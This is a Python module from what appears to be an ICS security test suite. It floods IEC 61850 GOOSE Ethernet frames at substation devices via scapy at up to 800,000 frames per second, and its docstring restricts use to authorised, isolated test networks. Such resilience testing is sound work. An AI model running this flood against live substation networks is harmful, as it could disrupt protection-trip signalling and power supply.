"""
測項：IEC 61850 GOOSE Raw Ethernet Frame 注入
分類：IEC 61850（變電站自動化常用協定，Layer 2，EtherType 0x88B8，多播）
說明：GOOSE（Generic Object Oriented Substation Event）是變電站自動化裡用來傳遞
     跳脫/保護連動等即時事件的機制，設計上追求極低延遲、不經過應用層確認，
     大量注入偽 GOOSE 訊框可測試 IED（智慧電子裝置）對非預期高頻訊框的處理
     韌性、以及網路交換器對此類多播流量的處理負荷。

重要限制：
  - 完整 GOOSE PDU 內容（gocbRef、datSet、goID、stNum/sqNum 等）使用 ASN.1 BER
    編碼，欄位相當多。這裡採用**簡化 payload**（固定內容），足以測試「高頻率
    L2 訊框湧入」情境，但不是完整、規格完全正確的 GOOSE PDU。若需要精確模擬
    stNum/sqNum 遞增行為（更貼近真實跳脫訊號情境），建議改用專門的 IEC 61850
    函式庫（如 libiec61850）。
  - Layer 2 操作，需指定實體網路介面，且**只能在受測、已授權的隔離變電站測試
    網段執行**，絕不可在生產中的變電站網路上使用（GOOSE 直接關聯保護跳脫邏輯，
    誤用風險極高，務必先與電力/保護team確認測試範圍）。
需求：scapy，且需要 root 或 CAP_NET_RAW 權限。
"""
import time

from ..common import RateLimiter, clamp_duration

NAME = "IEC 61850 GOOSE Raw Frame 注入"
CATEGORY = "IEC 61850 (GOOSE)"
PROTOCOL = "L2"
TEST_TYPE = "traffic"  # L2 多播訊框注入速率造成負擔的洪水攻擊

_DST_MAC_DEFAULT = "01:0c:cd:01:00:01"  # GOOSE 標準多播 MAC 範圍 01-0C-CD-01-00-00 ~ 01-0C-CD-01-01-FF


def get_param_schema() -> dict:
    return {
        "iface": {"type": "string", "default": "eth0", "desc": "發送用網路介面"},
        "dst_mac": {"type": "string", "default": _DST_MAC_DEFAULT, "desc": "GOOSE 多播目的 MAC"},
        "rate_pps": {"type": "int", "default": 800000, "min": 1, "max": 800000, "desc": "每秒送出訊框數"},
    }


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        from scapy.all import Ether, Raw, sendp
    except ImportError:
        log_fn("[!] 未安裝 scapy，請先執行 pip install scapy")
        return {"frames_sent": 0, "error": "scapy not installed"}

    duration = clamp_duration(duration)
    iface = params.get("iface", "eth0")
    dst_mac = params.get("dst_mac", _DST_MAC_DEFAULT)
    rate = int(params.get("rate_pps", 2000))

    # 簡化 payload：APPID(2) + Length(2) + reserved(4) + 固定示意內容
    payload = b"\x00\x01\x00\x10\x00\x00\x00\x00" + b"\x00" * 8

    pkt = Ether(dst=dst_mac, type=0x88B8) / Raw(load=payload)
    limiter = RateLimiter(rate)
    sent = 0
    start = time.time()

    log_fn(f"[+] 注入 GOOSE frame -> iface={iface}, dst={dst_mac}, {rate}pps, {duration}s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        try:
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
        except (PermissionError, OSError, ValueError) as e:
            # ValueError：scapy 在 iface 參數指向不存在的網路介面時丟出的例外類型。
            # 一併攔截可避免介面名稱打錯字時讓例外原始 traceback 冒出來，統一改為
            # 輸出下面這行乾淨的錯誤訊息。
            log_fn(f"[!] 發送失敗（權限、介面問題或介面名稱不存在）：{e}")
            break

    return {"frames_sent": sent, "elapsed_sec": round(time.time() - start, 1)}
